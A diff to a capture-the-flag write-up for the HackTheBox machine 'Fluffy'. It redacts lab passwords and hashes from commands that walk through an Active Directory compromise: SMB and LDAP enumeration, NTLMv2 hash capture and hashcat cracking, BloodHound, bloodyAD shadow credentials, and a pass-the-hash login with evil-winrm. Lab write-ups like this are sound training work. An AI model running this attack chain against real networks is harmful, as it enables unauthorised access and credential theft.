@@ -58,7 +58,7 @@ Before pushing our recon further, we first need to fix the clock skew.
 We can do this by getting the DC time using `ldapsearch` with our starting account, `j.fleischman`.
 
 ```bash
-ldapsearch -H ldap://10.129.9.229 -D "j.fleischman@fluffy.htb" -w "J0elTHEM4n1990!" -b "" -s base currentTime
+ldapsearch -H ldap://10.129.9.229 -D "j.fleischman@fluffy.htb" -w "[REDACTED]" -b "" -s base currentTime
 ```
 
 Once we have the DC time, we can set the system time using the `date` command.
@@ -73,7 +73,7 @@ Since port `445` is opened and used by `smb`, this mean there is probably some n
 We can list them using `smbclient` with our starting account, `j.fleischman`.
 
 ```bash
-smbclient -U "j.fleischman@fluffy.htb%J0elTHEM4n1990!" -L "\\10.129.9.229"
+smbclient -U "j.fleischman@fluffy.htb%[REDACTED]" -L "\\10.129.9.229"
 ```
 
 We find the expected default shares. But, one share stands out from the rest: `IT`.
@@ -92,7 +92,7 @@ SYSVOL          Disk      Logon server share
 We can use `smbclient` again to connect to explore it further.
 
 ```bash
-smbclient -U "j.fleischman@fluffy.htb%J0elTHEM4n1990!" "\\10.129.9.229\IT"
+smbclient -U "j.fleischman@fluffy.htb%[REDACTED]" "\\10.129.9.229\IT"
 ```
 
 Once we are connected, we can list the content of the share using `ls`.
@@ -194,13 +194,13 @@ The captured NTLM Hash is also displayed.
 09/11/2025 11:43:14 PM: INFO: Incoming connection (10.129.9.229,50657)
 09/11/2025 11:43:14 PM: INFO: AUTHENTICATE_MESSAGE (FLUFFY\p.agila,DC01)
 09/11/2025 11:43:14 PM: INFO: User DC01\p.agila authenticated successfully
-09/11/2025 11:43:14 PM: INFO: p.agila::FLUFFY:aaaaaaaaaaaaaaaa:2fc9cd8119df8a47c85ee47dbe2ef3a3:0101000000000000002d6683b023dc013d4c8d628ce842dd0000000001001000710057007600420054006d007600430003001000710057007600420054006d00760043000200100063004e004e0055007800660079004e000400100063004e004e0055007800660079004e0007000800002d6683b023dc0106000400020000000800300030000000000000000100000000200000b31b53eb431b23741fe65597989a5784b71140acc3cf749241116847aecce9420a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340031000000000000000000
+09/11/2025 11:43:14 PM: INFO: p.agila::FLUFFY:[REDACTED-NTLMV2-HASH]
 ```
 
 Now that we have the Hash, we want to make sure it's valid using `namethathash` and confirm the Hash type.
 
 ```bash
-nth -t "p.agila::FLUFFY:aaaaaaaaaaaaaaaa:2fc9cd8119df8a47c85ee47dbe2ef3a3:0101000000000000002d6683b023dc013d4c8d628ce842dd0000000001001000710057007600420054006d007600430003001000710057007600420054006d00760043000200100063004e004e0055007800660079004e000400100063004e004e0055007800660079004e0007000800002d6683b023dc0106000400020000000800300030000000000000000100000000200000b31b53eb431b23741fe65597989a5784b71140acc3cf749241116847aecce9420a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340031000000000000000000"
+nth -t "[REDACTED-NTLMV2-HASH]"
 ```
 
 ```bash
@@ -217,7 +217,7 @@ hashcat -m 5600 -a 0 hash.txt /home/bhugo97/pentest-toolbox/wordlists/rockyou.tx
 Bingo ! The password is cracked.
 
 ```bash
-P.AGILA::FLUFFY:aaaaaaaaaaaaaaaa:2fc9cd8119df8a47c85ee47dbe2ef3a3:0101000000000000002d6683b023dc013d4c8d628ce842dd0000000001001000710057007600420054006d007600430003001000710057007600420054006d00760043000200100063004e004e0055007800660079004e000400100063004e004e0055007800660079004e0007000800002d6683b023dc0106000400020000000800300030000000000000000100000000200000b31b53eb431b23741fe65597989a5784b71140acc3cf749241116847aecce9420a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340031000000000000000000:prometheusx-303
+P.AGILA::FLUFFY:[REDACTED-NTLMV2-HASH]:[REDACTED]
 ```
 
 Now that we have the `p.agila` user credentials, we should check if he has access to anything interesting.
@@ -226,7 +226,7 @@ To do this, we can use `bloodhound`.
 But, before using `bloodhound` to visualize our high value targets, we first need to collect data using `bloodhound-python`.
 
 ```bash
-bloodhound-python -d fluffy.htb -u p.agila -p prometheusx-303 -c All -ns 10.129.9.229
+bloodhound-python -d fluffy.htb -u p.agila -p [REDACTED] -c All -ns 10.129.9.229
 ```
 
 Once the data is collected, we can start `bloodhound` and upload the data we found with `bloodhound-python`.
@@ -251,28 +251,28 @@ This means we have a clear path to exploit.
 The first step is adding the user `p.agila` to the `Service Accounts` group using `bloodyAD`.
 
 ```bash
-./bloodyAD.py --host 10.129.232.88 -d fluffy.htb -u p.agila -p prometheusx-303 add groupMember "Service Accounts" p.agila
+./bloodyAD.py --host 10.129.232.88 -d fluffy.htb -u p.agila -p [REDACTED] add groupMember "Service Accounts" p.agila
 ```
 
 Now that we have a `GenericWrite` permission, the next step is to add shadow credentials to the `WINRM_SVC` service account.
 
 ```bash
-./bloodyAD.py --host 10.129.232.88 -d fluffy.htb -u p.agila -p prometheusx-303 add shadowCredentials winrm_svc
+./bloodyAD.py --host 10.129.232.88 -d fluffy.htb -u p.agila -p [REDACTED] add shadowCredentials winrm_svc
 ```
 
 This gives us the NT Hash for the `WINRM_SVC` service account.
 
 ```bash
-[+] KeyCredential generated with following sha256 of RSA key: 6afd9b4210821f5f7a980aed04c1a95106d1093bcbbed35e13fc2c622818495e
+[+] KeyCredential generated with following sha256 of RSA key: [REDACTED-SHA256]
 [+] TGT stored in ccache file winrm_svc_ta.ccache
 
-NT: 33bd09dcd697600edf6b3a7af4875767
+NT: [REDACTED-NT-HASH]
 ```
 
 Once we have the NT Hash, we can connect with `evil-winrm` using the `WINRM_SVC` service account.
 
 ```bash
-evil-winrm -i 10.129.232.88 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
+evil-winrm -i 10.129.232.88 -u winrm_svc -H [REDACTED-NT-HASH]
 ```
 
 After we connect, we can find the `user.txt` flag in the `Desktop` directory.
